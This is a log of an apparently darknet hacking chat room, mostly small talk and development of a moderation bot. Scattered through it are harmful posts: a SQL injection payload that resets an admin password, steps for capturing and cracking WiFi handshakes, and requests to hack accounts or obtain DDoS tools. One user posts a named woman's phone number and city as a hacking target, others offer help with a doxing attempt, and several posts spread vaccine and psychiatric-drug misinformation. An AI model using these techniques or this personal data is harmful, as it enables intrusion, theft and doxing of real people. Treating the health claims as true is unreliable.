[05-11 00:38:55] XplDan: hello guys, because this bot could be greedy I gave most of the members to be able to turn off/deactivate this bot. using dantcago! to actived dantcaof! for deactived. when I'm not on the tab, so if you see this bot is very greedy, you can turn it off. because to avoid looking spam maybe I will add a message to activate/deactivate it which will be visible for 1 minute and disappear. If you can't deactivate it, you can tag me. If you have any suggestions, etc., you can send them to me via PM. I'll afk. goodbye guys.. now there is a new feature for you, this bot will produce guests who try to be your twin.. I hope this helps you

Commands can be sent to user @0 to not flood the chat. To send a message to that user, click on the -All chatters- box at the top of the chat, and select the user @0.

You can send direct messages here. To do so, choose the person's nickname where it says -All chatters- or click it in the column at the right. You can write to everyone by clicking Guests: to the right or by choosing -All chatters- next to the Send to button.

[05-11 03:35:39] noone: How to learn hacking: You should start with learning a programming language. It will give you an understanding of what is commonly done wrong in a program and how it can be exploited. Once you've learned it, learn a few more. Good languages to start with are assembly and python. A good place to start with python: https://www.python.org/about/gettingstarted/ You should also learn basic system administration, especially on UNIX-like systems such as GNU/Linux. To become a hacker, it requires many years of experience in both programming and system administration. Don't forget to think outside the box.

[05-11 03:55:22] ARIONONE: ohhhhm well i was told to boot the ubuntu system new from a live usb stick, thats not the only solution, my roommate i live with is very very experienced but he has no heart,he would never take time to help me...... still after asking him he gave me the awnser that a new setup with a usb stick is easyest, otherwise it would be a major job to get my login password and root password found....i am a redicilous noob so i dont know what to do, i would have to save my entire pics and etc like fam pics, my daughters and my dogs pics etc to a stick or device, the only usb stick i have is to small for that, so 1. i cant save it all, first need a new usb stick or device with more than enough space, and 2. i would need a second usb stick to turn into a live boot stick :O

[05-11 11:24:30] Greg: if you want manipulate the behavior of the application by injecting queries that result in either true or false conditions.

here you go
SELECT * FROM users; UPDATE users SET password = 'hacked' WHERE username = 'admin'; --

[05-12 00:56:50] ZINOX: wassup
[05-12 00:57:19] XplDan: For now the staff and members will not be able to trigger this bot, maybe next time I will make a special one if you want to ask something to this bot, staff/members/admin can only deactivate and activate it. @rex

[05-12 00:57:57] kingnasir: this is my first time in this chat
[05-12 00:58:05] rex: bhcli ?
[05-12 00:58:00] rex: sounds awesome !!!! Is it based on an existing code base ?
[05-12 00:58:13] John: i need 1 hacker
[05-12 00:58:46] ZINOX: yeah i'm too
[05-12 00:59:01] kingnasir: for what
[05-12 01:00:44] rex: lets try again - 'i need a hacker - because i have xyz to do'... maybe try that !
[05-12 01:00:54] ZINOX: guys pls any method to how get password instagram ?
[05-12 01:03:39] rex: @XplDan still waiting with bated breath - lol
[05-12 01:04:25] XplDan: yap @rex I added several existing features such as chatlog etc
[05-12 01:04:59] XplDan: you can try dantcago! @rex to actived bot
[05-12 01:05:17] rex: thats brilliant @XplDan - really pleased you got something going !
[05-12 01:06:30] John: alo

[05-12 01:10:55] XplDan : afk..
[05-12 01:11:21] XplDan : Bot is now activated. by @XplDan
[05-12 01:12:50] MAPLE: @XplDan does it have an allow-list or does it detect who's a member?
[05-12 01:17:22] John: Please give me the horror link
[05-12 01:20:44] shwd: hi, question, how can i get the password to wifi? i need a tool, sometimes i use a wireshark, but i cant get the password :(
[05-12 01:29:38] XplDan: @maple I took the guest name from the span and ID tags, and read it using for so only the guest could trigger this bot. The list of members is still under development, and only a few members can activate and deactivate bots. which I have entered in the array (manual damm)

[05-12 01:29:36] MAPLE: to turn off the bot i think it's dantcaof with an "!". single "f"
[05-12 01:30:53] MAPLE: thanks for replying. was my comment about dantcaof correct?

[05-12 01:33:02] log4j: nice, gen 4 is out
[05-12 01:33:10] rex: @XplDan - i started doing manual add - but i found a way in bhcli to pass the member list down to my code and stop affecting mambers that way. Worked a treat !!! You could try that - though obviously depends how comfortable you are with it all
[05-12 01:33:23] kiwi: I'm just copying a rap, I'm saving up for a marlin 45
[05-12 01:33:34] log4j: ah
[05-12 01:33:42] log4j: cool
[05-12 01:34:12] log4j: a 12 guage has lots of power
[05-12 01:34:51] XplDan: No need to worry, I've set it up to not be able to order from m chat i thine @maple dantcaoff! to deactived
[05-12 01:34:47] MAPLE: is the XplDan bot based on Luke?
[05-12 01:35:13] kiwi: 45 is a rifled slug
[05-12 01:35:30] kiwi: I would prefer a lever action 45 for hunting this summer
[05-12 01:35:40] XplDan: maybe I'll take the code from bhcli's n0tr1v @rex
[05-12 01:36:05] rex: this is a chat about hacking in the traditional sense - not rap - not guns
[05-12 01:36:49] rex: @XplDan - thats what i did and unfortunately - thanks to the nature of forking code - its out of date now and i just cannot be bothered to pour more time into it - i spent hours on the damn thing - many many of them
[05-12 01:36:59] ADIB: fot a business jajajaja
[05-12 01:37:18] MAPLE: cue the conversation about machetes
[05-12 01:37:14] rex: i tried to make changes to reflect there not being a number captcha here anymore and its just foobared
[05-12 01:38:26] XplDan: I actually want to learn how the Luke bot works. give a warning first if the guest repeats the bot's kick
[05-12 01:38:34] rex: lol @MAPLE - if i could get my hands on a machete to that code
[05-12 01:39:03] MAPLE: from bhcli

enum ClientType {
 BHC,
 Dan,
 Custom,
}

[05-12 01:39:23] rex: LUKE is now dead unfortunately - i spent hours (yep - more hours) trying to remove the number checking code and just cant get it done - i need notriv really - but i dont wanna bother him too much
[05-12 01:39:47] rex: thats interesting @MAPLE
[05-12 01:40:09] MAPLE: @rex i was commenting on your warning to the guests that "this is a chat about hacking in the traditional sense"
[05-12 01:40:34] log4j: oh
[05-12 01:40:46] MAPLE: ClientType::BHC was for this site when it had the numbers captcha
[05-12 01:40:51] rex: @MAPLE - yup - lol i hear you
[05-12 01:41:23] MAPLE: ClientType::Dan makes it look for the captcha that has the red line
[05-12 01:41:20] rex: ahhh @MAPLE - i'll check it out again now !!!! thanks for that tip !
[05-12 01:42:06] log4j: what about kilowatt, focused speakers? The kind that combines hacking with force strong enough to delete those that want to harm the home
[05-12 01:42:14] MAPLE: you'll want it to use the code path for ClientType::Custom
[05-12 01:43:22] log4j: if 800W at 3m = "Error: No audio device", then 1KW at 1.5m = "Client disconnect: broken pipe"
[05-12 01:44:08] MAPLE: after Strange explained the --url parameter i tried --url with http://blkh4ylofapg42tj6ht565klld5i42dhjtysvsnnswte4xt4uvnfj5qd.onion/index.php as the URL. i didn't have to change the code for it to work
[05-12 01:44:35] rex: @MAPLE for pres ! lol
[05-12 01:45:16] MAPLE: if you change the hard-coded URL then --url is likely to work with the blkhat... URL
[05-12 01:45:40] rex: thanks
[05-12 01:46:57] MAPLE: i assume you can change a conditional or a few of them so that the hard-coded blkhat... URL selects ClientType::Custom instead of ClientType::BHC
[05-12 01:47:12] kiwi: wow real cuck and uptight of you
[05-12 01:47:07] log4j: hi @McLovin
[05-12 01:47:34] kiwi: this is the most useless chatroom for hacking its just a bunch of safety messages and a honeypot
[05-12 01:47:25] MAPLE: thanks for the compliment @rex
[05-12 01:47:48] Mclovin: @log4j hi
[05-12 01:49:21] log4j: hi, what do you think of kilowatt focused speakers, with the power to make a bear drop like a bag of flour
[05-12 01:49:18] rex: @MAPLE i tried to pass the adderss withurl and it still failed :((

[05-12 14:05:10] MARX: sometime yes
[05-12 14:06:00] jojoisgoodanime: So guys I have a problem with my isp, 2 years ago my internet speed was okay and stable , but now it's slow and cut off from time to time , and I feel like the ISP is throttling my internet
[05-12 14:05:58] MARX: you must be careful to have correctly written the directory in which the rockyou.txt file is located
[05-12 14:06:16] xpltest: okay is working last kick whare buy gun
[05-12 14:06:35] jojoisgoodanime: is there a solution?
[05-12 14:08:27] MARX: sorry idk
[05-12 14:08:46] ZINOX: @MARX hydra doesn't working
[05-12 14:08:37] STUXNET: @jojoisgoodanime try running some diagnostics (i.e. a speed test) and then use a VPN to conduct those same diagnostics. It may help you confirm any suspicions about your ISP throttling your connection.
[05-12 14:09:14] FeelCallins: @Zesty :) [b4coffee_aftercoffee.jpg]
[05-12 14:09:09] xpltest: where hitmen to cool
[05-12 14:09:04] STUXNET: That is not a "solution" but it is a step in gathering information which will help you construct a solution.
[05-12 14:09:28] XplDan: Hallo @xpltest : warn : Hitmen have nothing to do with us BYE BYE... is bad
[05-12 14:09:23] STUXNET: Do you notice certain applications are affected more/less than others?
[05-12 14:10:11] MARX: @ZINOX what does he say to you?
[05-12 14:10:01] Zesty: I'm sick I can't even have water rn without getting sick
[05-12 14:10:21] STUXNET: For example, your ISP might throttle Tor traffic. For the purposes of testing you can create a VPN connection and then route your Tor traffic over it. This is not necessarily recommend it but I suggest it for the purposes of testing.
[05-12 14:10:36] XplDan : come back
[05-12 14:11:08] STUXNET: The same principal applies to torrenting and other types of traffic that your ISP thinks they can manipulate without you noticing/complaining.
[05-12 14:11:32] XplDan: wb @Feelcallins && @zesty && priya
[05-12 14:11:57] XplDan: dantcaoff!
[05-12 14:11:44] jojoisgoodanime: both are the same speed, but I noticed when usind a vpn the speed get stuck at 30mbps then slowing goes down to the original speed than I get when not using a vpn (1.5mbps)
[05-12 14:12:34] priya: thnx XplDan
[05-12 14:12:22] ZINOX: there is no password valid

[05-12 14:12:04] FeelCallins: ty @XplDan :)
[05-12 14:12:03] STUXNET: The same principle applies to torrenting and other types of traffic that your ISP thinks they can manipulate without you noticing/complaining.
[05-12 14:12:51] Zesty: I think they changed the laws in the US you can't get throttled anymore
[05-12 14:13:42] MARX: mean that none of the passwords are right
[05-12 14:13:42] jojoisgoodanime: me no usa, me far usa
[05-12 14:13:56] STUXNET: A quick Google search showed that it might not be illegal in the United States @Zesty. That is a good point though.
[05-12 14:13:42] jojoisgoodanime: me no usa, me far usa
[05-12 14:14:47] ZINOX: yep
[05-12 14:15:08] MARX: change another dictionary

[05-12 16:43:13] whatutalkinbout: @OnionsAndDragons thanks bud
[05-12 16:43:40] MARX: what are you taling??
[05-12 16:44:12] MAPLE: @soul i linked some news sites about cybersecurity at 16:04:25
[05-12 16:44:31] soul: @hello , that's called "defacing website" it isn't that u would jst use an automated tool and it will deface it for u , u actually hae to learn the technicalities of web application working
[05-12 16:44:53] whatutalkinbout: @OnionsAndDragons do you have a website for codes or something like that for hacking any social media
[05-12 16:45:20] OnionsAndDragons: @soul to be associated with the AP basically means to be authenticated/loggedinto the router/AccessPoint
[05-12 16:45:11] MAPLE: @soul associated is another word for logged in
[05-12 16:45:35] MAPLE: or connected
[05-12 16:46:09] hello: @soul What tools can be used for this "defacing website"

[05-12 16:48:21] Axr: hello
[05-12 16:48:41] MAPLE: defacing a website means changing its contents maliciously
[05-12 16:48:53] whatutalkinbout: @MAPLE i am talking for real
[05-12 16:49:25] soul: @MAPLE can't i be connected with AP using airmon-ng airodump-ng , when i saw what these two simple commands could give me i was fasicanated so what else could i do , what else to get inot the router , now i don't wanna get into the router specifically i wann know how to get into the router [that's the same thing , isn't it]
[05-12 16:49:18] MAPLE: @whatutalkinbout i'm telling you it's not real
[05-12 16:50:09] whatutalkinbout: @MAPLE i need to have access in system of tiktok
[05-12 16:53:26] soul: @MAPLE , isn't haschat a bruteforcing tool , well that can't gurantee me the access ,, i want something that would guarantee me the access....
[05-12 16:54:04] xpltest: statusdan!
[05-12 16:54:28] XplDan : >>> --- bot still off --- <<<
[05-12 16:54:51] MAPLE: @soul you can use it with a word list, i believe. there is no guarantee. if someone used a strong passphrase, you won't crack it
[05-12 16:54:47] xpltest: dantcago!
[05-12 16:57:06] MAPLE: i thought the idea was that guests couldn't control the bot, yet xpltest is a guest - an unregistered one
[05-12 16:55:04] XplDan : >> --- Bot is now activated. by @xpltest --- <<
[05-12 16:57:21] xpltest: where torture here? lorem ipsum dno
[05-12 16:57:34] soul: @MAPLE , the thing what was it ....capturing the handshake
[05-12 16:58:09] OnionsAndDragons: @soul I'm probably wrong, but as I understand it, when you are listening in what is sometimes called "promiscuous mode" to traffic which you have no 'association' with.. you can capture Handshakes, where a different user is authenticating/associating with the router/AP.. that is like getting a model of the lock.. when you then run hashcat, it is bruteforcing hashes against the handshake, offline, until it finds the right key to open the lock... something like that. but it's not like standing at the door picking the lock in plain view, or sending brutish requests until one doesn't fail
[05-12 16:58:04] MAPLE: the commands are sent in the main chat, too. this seems insecure
[05-12 16:57:55] XplDan: -> Hallo @xpltest -> Your Warning -> Torture is a [BANNED TOPIC] You can be kicked dont break it again -<
[05-12 16:58:43] MAPLE: @soul yes, the aircrack-ng suite can do that. hashcat can only do the cracking
[05-12 16:59:26] MAPLE: you give hashcat the logs you made with aircap-ng. probably after some conversion
[05-12 16:59:49] darkcat: loans?
[05-12 17:00:03] MAPLE: or is it airodump
[05-12 16:59:53] XplDan: no guest maple can't control this bot. I excluded the name xpltest @maple
[05-12 17:00:36] OnionsAndDragons: if you only passively listen, it can take a long time to get many handshake packets.. if you actively deauthenticate people, you can get more handshakes quicker, but could also alert them that there is an attack on their network.. and it is typically not legal to interfere with somebody else's network like that
[05-12 17:01:00] MAPLE: airmon-ng, perhaps. there are tutorials about this
[05-12 17:01:00] soul: @OnionAndDragons , yes that was what i was trying to say ; capturing the handshakre between the client and the AP , then attempting to crack it with hashchat using the hashes u got from airodum-ng
[05-12 17:01:09] XplDan: no guest can't control this bot. I excluded the name xpltest
[05-12 17:01:00] soul: @OnionAndDragons , yes that was what i was trying to say ; capturing the handshakre between the client and the AP , then attempting to crack it with hashchat using the hashes u got from airodum-ng
[05-12 17:01:34] fakexpl: dantcago!
[05-12 17:01:59] MAPLE: thanks for answering @XplDan
[05-12 17:02:25] hello: does anyone have any script for ddos
[05-12 17:02:57] MAPLE: now i realize that xpltest was testing with some dubious messages
[05-12 17:02:48] soul: @MAPLE , will it go like this : sudo airodump-ng wlanm0n , sudo airodump-ng --bssid __ --channel __ -w capture file wlanm0n
[05-12 17:04:20] MAPLE: instead of having a list of members and looking for commands in the main chat, maybe listen for commands in the members' chat
[05-12 17:04:48] MAPLE: @soul as you see i don't know the particulars. maybe check a tutorial or two
[05-12 17:05:33] MAPLE: instead of naming the capture file after the interface, you might want to name it after the bssid
[05-12 17:05:42] OnionsAndDragons: yeah I haven't tried cracking wifi since the days of WEP
[05-12 17:14:17] fakexpl: dantcago!

[05-13 12:13:58] N3xu5: Hey how did @XplDan connect with CLI of BHC
[05-13 12:14:35] LuLu: the link is a clearnet invidious link
[05-13 12:14:43] mf4king: interesting work - I'm learning some python stuff :)
[05-13 12:15:37] XplDan: STUXNET next time i will upload to git.dfk
[05-13 12:16:06] xpltest: @N3xu5 bhcli
[05-13 12:17:50] N3xu5: It's some problems on session-desktop , jst doing that , wait...
[05-13 12:16:17] XplDan: hallo, @xpltest -> http://dkforestseeaaq2dqz2uflmlsybvnq2irzn4ygyvu53oazyorednviid.onion/bhcli
[05-13 12:19:03] SUPO: the tunnel vision vulnerability needs LAN access at which point you could simply block the connection between the vpn server and make the person think their VPN is broken and they stop using it
[05-13 12:19:43] XplDan: @N3xu5 n0tr1v's bhcli cannot be used for the newest BHC. I've fixed the bhcli Rex has. Do you want?
[05-13 12:20:21] N3xu5: yes @XplDan , would love to check that out!
[05-13 12:21:44] LuLu: @SUPO yeah but no one is going to do that though. the point is to make the victim think its working so they never check it out
[05-13 12:30:55] John: https://www.facebook.com/profile.php?id=61559625122448
[05-13 12:31:18] XplDan: @N3xu5 Looks like I can't send Rex's, because he's not here. Maybe I'll give you the repaired BHCLI
[05-13 12:31:39] LuLu: the browser is cool. I switched from protonvpn to mullvad. Same speed and way cheaper. only thing is that I can't do streaming but I think its a fair trade when it comes to privacy.
[05-13 12:32:01] Vega32: Hello, I have a question: If you buy bitcoins anonymously with an anonymous wallet, can you use credit card data to trace who a wallet belongs to, e.g. Exodus wallet without kyc or identity process
[05-13 12:32:31] XplDan: @N3xu5 /home/dantca/Downloads/bhcli.zip @members here this
[05-13 12:32:42] N3xu5: @XplDan , jst pass on what u have , i jst have to take a look at how does it work/used to work....

[05-13 12:33:59] XplDan: here [bhcli.zip]
[05-13 12:34:16] LuLu: for anyone who wants to read things in deeper detail this is the security group who found the flaw https://www.leviathansecurity.com/blog/tunnelvision
[05-13 12:34:52] Vega32: Ok then do you know a site where you can buy Monero with credit card details without the kyc procedure LG
[05-13 12:34:51] LuLu: reading over their blog post makes me wish I understood networking lol
[05-13 12:36:04] XplDan: here [bhcli.zip]
[05-13 12:37:31] xx77xx: how to buy crypto anonymously?
[05-13 12:37:29] LuLu: @Vega32 Nah I don't have enough knowledge about it. But I will say be careful buying anything with credit cards cause yeah that is always recorded somewhere.

 particular scheme selected, URL schemes that involve the direct use
 of an IP-based protocol to a specified host on the Internet use a
 common syntax for the scheme-specific data:

 Some or all of the parts "<user>:<password>@", ":<password>",
 ":<port>", and "/<url-path>" may be excluded.

[05-14 04:57:57] shii: What exactly is the deep web?

Deep Web is anything not found by a search engine. So technically, Facebook, YouTube etc. are partly deep web, because there are private sections you can't find on Google, like your messages.
Surface Web refers to anything that is to be found on search-engines like Google.
Deep Web and Surface Web are both part of the so-called clearnet, which is anything accessible with normally configured computers.
Darknet is anything that requires special software like Tor, I2P, Freenet or a VPN to access (and thus is a small part of the deep web)
Dark Web refers to all websites hosted on darknets.
Any other terminology like "Shadow Web", "Mariana's Web" or "Closed Shell System" are internet jokes that do not exist, despite many people claiming it and a lot of scammers "selling" access to it.
Many YouTubers like to brag about "the deep web", making it look like the worst place that ever existed. However, 99% of what they tell you is just made up to get more subscribers and views.
Most commercial services on the Tor network are made to scam people. Be careful!

[05-14 09:37:54] Darkmatter: But if you do not care just spam crap in popular places on twitter would be the best way to go about it

[05-14 09:48:47] jsgshi: without any buy AD
[05-14 09:51:59] ultra: In the shadows of a global fear,

A whisper of a conspiracy, they drew near,

A serum vowed to shield and save,
Or so they claimed with a sly sneer,

But beneath the surface, a sinister plan,

To thin the herd, to lessen the clan,

A vaccine, a ruse, a deadly lure,

To depopulate the Earth, that's for sure.

Once trust was broken, the truth was clear,

A bitter pill for all to bear,

A betrayal of the human race,

A dark and twisted, cold embrace.

But we, the people, will not be swayed,

We'll stand and fight, we'll not be enslaved,

We'll raise our voices, loud and proud,

We'll reclaim our Earth, our power, our crowd.

So let this be a warning, to all who'd scheme,

We'll not be silenced, nor made to be a dream,

We'll hold our ground, we'll stand our ground,

We'll never let you depopulate our Earth, round.

[05-14 10:04:50] Aera23: hey all ^.^
[05-14 10:05:29] ciph3r: sup @Aera23
[05-14 10:05:52] Aera23: sup 🟤 🔴 🟠 🟡 🟢 🔵 🟣
[05-14 10:09:10] Aera23: why is a vaccine consideered deadly lol... vaccines are quite safe, better than the disease it prevents
[05-14 10:10:29] ultra: look up the death rate for young people since the covid vaccine
[05-14 10:11:40] Aera23: hasn't changed much, don't forget mental health related deaths influence death rate
[05-14 10:12:07] Darkmatter: A good friend of Ours His entire family got the COVID-19 shot, and they were all fine but they had a 5 year old child who mysteriously died of a "heart" arrhythmia, fucking tragic
[05-14 10:13:13] Aera23: mm, that can happen, heart arrhythmia can happen to anyone at any time, tho is rare in young ppl
[05-14 10:13:35] ultra: they are all fine... for now
[05-14 10:13:53] Aera23: could be anything from coexisting heart conditions to rare adverse effects (1 in 1 million or so)
[05-14 10:13:43] Darkmatter: mental health related deaths influence death rate- Anti-psychotic drugs prescribed by "Mental Health" doctors cause Suicidal Ideation and Anhedonia SSRI drugs also cause this.
[05-14 10:14:16] Aera23: oh yes
[05-14 10:15:01] Darkmatter: Anti-Psychotic drugs and SSRI drugs remove "Feel Good" chemicals from your brian, So therefore if you are suicidal they give you medication to "Take away" thoes little bit of chemicals that make you "Feel Good"
[05-14 10:15:14] ultra: @Aera23 it changed a lot actually, same for cancer rate
[05-14 10:15:43] Aera23: reuptake inhibitors prevent the chemicals from being reabsorbed too early
[05-14 10:16:41] Darkmatter: "Mental Health" drugs such as SSRI drugs and Anti-Psychotic drugs were invented by the Nazis in the 1930's as a torture device, do you have any idea about the pharmacokinetics of these drugs you are speaking about?
[05-14 10:16:49] Aera23: interesting, cancer rate increases... work from home = more exposure to indoor pollutants, amazon shopping increases, more pollution from chinese factories, etc..
[05-14 10:17:41] ultra: yes, it's not the vaccine... it's working from home XD
[05-14 10:17:15] XplDan: -> Hello @darkmatter -> Your Warning -> Torture is a [BANNED TOPIC] You can be kicked, don't break the rules again -<

[05-14 10:18:58] ciph3r: he set up a bot I guess
[05-14 10:19:02] Aera23: the vaccine, is usually safe, yes, there is a small chance of a bad batch, but the chance of covid harm is greater
[05-14 10:19:35] Aera23: mm / hi
[05-14 10:20:10] ultra: @Aera23 how much do they pay you to shill it here lol also everyone that got vaxxed got covid anyway
[05-14 10:20:07] Darkmatter: yes... greater harm, like a 99.8% survival rate....
[05-14 10:20:28] ciph3r: the risk of diseases they prevent are way higher then the very rare side effects of vaccines
[05-14 10:20:51] Aera23: oh yes, I got vaxxed and covid, but it was moderate for a day, and mild for a few days, not severe
[05-14 10:21:33] Aera23: I'm paid $0.00 to say it... yes, not a cent, not even a satoshi (less than a cent)
[05-14 10:22:08] ultra: look up the subreddit /r/covidvaccined lol, it used to be a shillfest now it's just people that regret it
[05-14 10:22:06] Darkmatter: We have Physical Documents from a Millitary Officer which states the vaccine contains "MRNA Messenger" Do you know what that means?
[05-14 10:22:02] helper: someone hack this number +254110691949 its connected to bank accounts and has cash on its wallets and receives about 2000 dollars every month
[05-14 10:23:20] helper: name of the card holder is Dorcas wairimu ndungu residence nairobi kenya
[05-14 10:23:30] ultra: @Aera23 you realize you took the first synthetic vaccines that were experimental right? you can't time travel to see the future side effects

[05-14 20:31:15] MAPLE: @Omigel in le-chat-php it's a password that is needed to enter as a guest. someone has to tell it to you before you enter the site
[05-14 20:31:34] FeuerWasser: Wir sind ziemlich spektakulär, wenn auch nicht sehr gesellig
[05-14 20:31:43] MAPLE: i think Omigel is asking what it means
[05-14 20:32:47] Omigel: yeah how i can get it
[05-14 20:34:34] MAPLE: someone has to tell it to you before you enter the site @Omigel
[05-14 20:35:08] altercation: i can enter the site without even a password
[05-14 20:35:10] MAPLE: you could read it in a forum post etc.
[05-14 20:35:26] altercation: or just using my own password
[05-14 20:36:35] Floppadude: @altercation ?
[05-14 20:36:46] Floppadude: I know you?
[05-14 20:36:44] Omigel: It's Japanese name for chat site
[05-14 20:36:43] MAPLE: @altercation you can enter this site without a global password. some other le-chat-php sites use it. for example Kawaii Chat and The Grey Zone
[05-14 20:37:21] Floppadude: Altercation
[05-14 20:37:36] altercation: @Floppadude my bad you just have the exact same name as someone that i know from somewhere else

[05-14 20:38:31] altercation: @MAPLE makes sense i guess
[05-14 20:39:01] altercation: @Floppadude no i know someone that just goes by Floppa
[05-14 20:39:17] MAPLE: on this site it's good to use a password, one that isn't weak. otherwise people may guess it and mess with your session
[05-14 20:39:20] Floppadude: Big Floppa I love that animal asf
[05-14 20:39:47] altercation: nigga what
[05-14 20:40:08] david: @maple its asking for the global password
[05-14 20:40:06] XplDan: -> Hello User @altercation -> Your Warning -> Offensive terms are bad form. SORRY.. try !rules -<

[05-14 20:42:11] Floppadude: well no one know's how to get Gmail by IP adress
[05-14 20:42:36] sgml: @alter kennt amn sich?
[05-14 20:42:35] david: oh sorry @maple i dont know that
[05-14 20:42:35] MAPLE: @XplDan you gave a warning, then kicked 22 seconds later.
[05-14 20:43:39] MAPLE: that isn't enough time for someone to react
[05-14 20:43:54] FeuerWasser: Nein, ich kenne ihn nicht, lol
[05-14 20:44:13] FeuerWasser: all good !lmao
[05-14 20:44:42] FeuerWasser: thats fair i did the same so my bad as well
[05-14 20:44:48] altywalty: @Floppadude thats not even possible LOL
[05-14 20:45:34] altywalty: in my opinion an IP address is more useful than an email but it depends on what you're using it for
[05-14 20:46:30] Omigel: @MAPLE Ok get thim
[05-14 20:46:46] sonyblack: hi!
[05-14 20:47:05] MAPLE: some webmail services add an X-Originating-IP header that tells the IP address the sender was using
[05-14 20:47:05] sonyblack: someone have deepast onion link ?
[05-14 20:47:05] sonyblack: someone have deepast onion link ?
[05-14 20:47:40] chinchon: @Floppadude i think that u should use the ip in order to gain other infos, and then maybe using some OSINT
[05-14 20:47:05] sonyblack: someone have deepast onion link ?
[05-14 20:48:24] Floppadude: problem is I didn't used IP grabber. he sent his own ip accidently to his ex-friend that sent me it
[05-14 20:48:57] MAPLE: @sonyblack the levels of darkweb aren't real https://rationalwiki.org/wiki/Deep_web#Deep_web_.22levels.22
[05-14 20:49:42] altywalty: @Floppadude are you trying to dox someone? if so then i can help you out. im experienced in that sort of thing
[05-14 20:50:46] Floppadude: I am trying to doxx yes but the dude is not gonna be fished easily on ip grabber or any but yea I only know about he is in Craiova city in Romania and got his IP adress
[05-14 20:51:12] MAPLE: this isn't a market, just a chat. caveat emptor
[05-14 20:51:35] dimitri: Hi guys i need some docs related to SS7 protocols and telecommunications !
[05-14 20:52:17] MAPLE: no doxing, please
[05-14 20:52:28] altywalty: why did you kick floppa?
[05-14 20:52:44] MAPLE: @dimitri https://ss7.info/
[05-14 20:52:41] altywalty: Rules
No CP/spam/gore/other illegal activity
[05-14 20:53:01] altywalty: @MAPLE he wasnt doxxing anybody in here, he just needed help with doxxing
[05-14 20:53:36] altywalty: its a darknet chat room ofc you're gonna have people discussing hacking other people
[05-14 20:53:58] altywalty: trying to outlaw that would be like trying to outlaw towel snapping in a locker room
[05-14 20:53:51] chinchon: @MAPLE how u have always a useful link? XD
[05-14 20:55:22] MAPLE: @altywalty i didn't say he was doxing someone who is chatting here, if that is what you meant. he did dox someone, however. he gave the person's city. earlier he gave the person's IP address. you recognized it yourself and offered to help. that too is not allowed.

05-14 20:49:42 - altywalty - @Floppadude are you trying to dox someone? if so then i can help you out. im experienced in that sort of thing
[05-14 20:56:10] MAPLE: @altywalty you can complain to the admins through SuggestionBox
[05-14 21:03:29] MAPLE: thanks for the compliment @chinchon. usually it means i looked into the subject before
[05-14 21:04:09] MAPLE: or that others here heard a question often enough that the staff made a help text
[05-14 21:13:59] XplDan : come back after afk ...

[05-14 21:33:43] Zesty: I found a way to vnc into my onion site after running x11vnc in a ssh session
[05-14 21:25:30] MAPLE: @James28 stop bumping so much please
[05-14 21:20:41] MAPLE: a warning is usually used as an alternative to a kick. the person is warned and allowed to continue chatting. then if they misbehave again there might be a kick
[05-14 21:20:39] James28: Is anyone able to find someone info with a snap username? im ready to pay like 50$
[05-14 21:20:17] James28: Is anyone able to find someone info with a snap username? im ready to pay like 50$
[05-14 21:17:39] MAPLE: you mean the kick should come 5 seconds after the warning?
[05-14 21:54:49] MAPLE: @Zesty why not use character mode?
[05-14 21:58:10] Zesty: Yeah @Greg got no idea how to do that I'm sitting in a hospital bed wearong a diaper though ;)
[05-14 21:57:56] MAPLE: @Zesty ssh has the -X option, for X11 forwarding
[05-14 21:58:59] MAPLE: i hope you'll be OK
[05-14 21:59:28] Zesty: I got a dynamic domain setup scared someone will find my ip lmao

[05-15 08:56:27] lucifer: Guys i need pegasus if anyone have?
[05-15 08:56:33] hckie1212: How to learn hacking: You should start with learning a programming language. It will give you an understanding of what is commonly done wrong in a program and how it can be exploited. Once you've learned it, learn a few more. Good languages to start with are assembly and python. A good place to start with python: https://www.python.org/about/gettingstarted/ You should also learn basic system administration, especially on UNIX-like systems such as GNU/Linux. To become a hacker, it requires many years of experience in both programming and system administration. Don't forget to think outside the box.

05-15 18:37:15 - FeelCallins: hacking itself isnt necessarily illegal It depends on the context and the intentions behind it wacking with the intent to gain unauthorized access to computer systems or data is illegal and considered a cybercrime However ethical hacking also known as penetration testing or white hat hacking, is legal and involves testing computer systems for security vulnerabilities to improve their security posture (Audit).

05-15 19:26:05 - FeelCallins: @ARIONONE EFFIGY DARKWEB TIPS   1:Don't share any personal information  2:Don't engage in illegal activity, most public services on the darkweb are there to scam you out of your money or honeypots by agencies to catch you.  3:Don't believe in "buying access to the Mariana Trench or Maria's Web", that's a scam.  4:Don't believe in Red Room access, TOR does not have the speed to stream content and real live torture or murder is only streamed in circles of organized crime, the public does NOT have access to these kinds of things and anyone telling you they do are lying or trying to scam you.  5:Don't download and execute anything especially if you're new, you're very likely to get hacked.  6:Try to keep the TOR Browser on the most secure option, it's safest especially if you don't know where you're ending up.  7:Be aware of the fact you can stumble into very nasty material, so if you're not mentally capable of dealing with seeing those things, try to avoid them. Also; if you use directories, you are often able to see a title and description of the site that it links to, which is a better way of knowing where you're going.    NOTE: FOLLOWING THIS ADVICE DOES NOT MEAN YOU ARE 100% SAFE, PLEASE EXERCISE CAUTION AND STAY SAFE

05-15 19:49:39 - ARIONONE: i will not google it, i like using my brain :D, my empty brain xD
05-15 20:02:19 - XplDan: @MAPLE I took the filter from Luke Bot. where the topic is bent (directly kicked) card*ng c*p and several. Meanwhile, for hot topics (they will be given a second chance) such as marketplace, gore and several others, if he violates again discussing gore he will be kicked. I hope you understand this hall. I use google translate because I'm really bad at English.

05-15 20:56:21 - LuLu: @rex yeah I didn't know it happend this morning. That was pretty fast that the fbi seized it. Makes me wonder if they had access all this time
05-15 20:56:12 - Misanthrope: but yeah i get it, always stay humble about urself ^^
05-15 20:57:03 - Misanthrope: u call few what for 99% of the population is not even comprehendable
05-15 20:56:56 - Odilla: Yw ^^
05-15 20:57:13 - rex: i wonder how they got their hands on it - there must have been some compromise somewhere ?
05-15 20:57:10 - blackhat: I'm not disrespecting or not breaking rules..
05-15 20:57:38 - blackhat: ohh wow..
05-15 20:57:35 - Schw0z: What breach?
05-15 20:57:26 - rex: LuLu
05-15 20:58:08 - soma: I'm new on Tor. What are some cool things to explore for fun, and what is the biggest "dangers" here?

05-15 20:58:27 - LuLu: ooh okay
05-15 20:59:14 - blackhat: hitmans mare the biggest dangers lol
05-15 20:59:22 - JJJ: @blackhat ohh nice
05-15 20:59:35 - Schw0z: [Odilla to Schw0z] - A data breach is an incident in which sensitive, confidential, or protected information is accessed, stolen, or disclosed without authorization.
05-15 20:59:34 - soma: arent those fake?
05-15 20:59:55 - LuLu: I may sound paranoid @rex but I think they had access since they got pom the old admin.
05-15 20:59:53 - blackhat: btw over here they do only hacking stuff
